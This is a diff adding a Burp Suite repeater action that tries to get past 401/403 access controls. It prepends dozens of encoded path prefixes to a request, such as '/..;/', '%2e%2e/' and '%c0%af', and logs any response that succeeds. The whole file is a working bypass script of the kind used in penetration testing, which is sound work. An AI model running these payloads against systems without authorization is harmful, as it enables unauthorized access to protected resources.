@@ -1,0 +1,62 @@
+id: b089c2e1-45f8-4b7b-9c6d-bypass-prefix-001
+name: 403/401 Bypass - Path Prefix
+function: CUSTOM_ACTION
+location: REPEATER
+source: |+
+  // 403/401 Bypass - Path Prefix Manipulation
+  // Tests bypass by prepending various prefixes to the path
+  
+  int DELAY_MS = 50;
+  boolean VERBOSE = true;
+  
+  String[] PATH_PREFIXES = {
+      "/;/", "//;/", "/.;/", "/..;/", "/%2e/", "/%2e%2e/", "/%2f/",
+      ";/", ";?", ";/;/", "..;/", "../", ".;/", "%2e%2e/", "%2f",
+      "%09", "%0a", "%0d", "%20", "%23", "%2e", "%2e%2e", "%3b",
+      "%c0%af", "%ef%bc%8f", "//", "///", "////",
+      "/./", "/../", "/..;/", "/.;/", "/;/",
+      "%2e%2f", "%2f%2e", "%2f%2e%2e", "%2f%2e%2e%2f"
+  };
+  
+  var originalRequest = requestResponse.request();
+  var httpService = requestResponse.httpService();
+  var originalPath = originalRequest.path();
+  int originalStatus = requestResponse.response().statusCode();
+  
+  logging.logToOutput("=== 403/401 Bypass - Path Prefix ===");
+  logging.logToOutput("Target: " + httpService.host() + originalPath);
+  logging.logToOutput("Original Status: " + originalStatus);
+  logging.logToOutput("");
+  
+  int total = 0, success = 0;
+  
+  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
+      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
+  
+  for (String prefix : PATH_PREFIXES) {
+      try {
+          String newPath = prefix + originalPath;
+          var req = originalRequest.withPath(newPath);
+          var resp = api.http().sendRequest(req);
+          Thread.sleep(DELAY_MS);
+          
+          int status = resp.response().statusCode();
+          String note = newPath + " -> " + status;
+          
+          if (isSuccess.test(originalStatus, status)) {
+              success++;
+              logging.logToOutput("[+] SUCCESS: " + note);
+              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
+              rr.annotations().setNotes("Path Prefix Bypass: " + note);
+              api.organizer().sendToOrganizer(rr);
+          } else if (VERBOSE) {
+              logging.logToOutput("[-] " + note);
+          }
+          total++;
+      } catch (Exception e) {
+          logging.logToError("Error: " + e.getMessage());
+      }
+  }
+  
+  logging.logToOutput("");
+  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
